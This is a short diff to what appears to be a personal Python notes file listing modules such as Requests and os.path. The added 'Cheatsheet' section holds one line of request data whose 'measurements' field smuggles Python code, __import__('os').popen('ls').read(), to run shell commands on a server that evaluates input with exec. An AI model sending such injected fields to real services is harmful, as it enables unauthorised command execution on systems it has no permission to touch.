@@ -5,6 +5,13 @@
 * Requests ([Documentaton](https://docs.python-requests.org/en/latest/)).
 * OS PATH ([Doc](https://www.geeksforgeeks.org/os-path-module-python/))
 
+## Cheatsheet
+
+```
+# Run commands throught request exec
+data = {'ingredient': 'our_var', 'measurements': '__import__("os").popen("ls").read()'}
+```
+
 ## Subprocess&#x20;
 
 ```
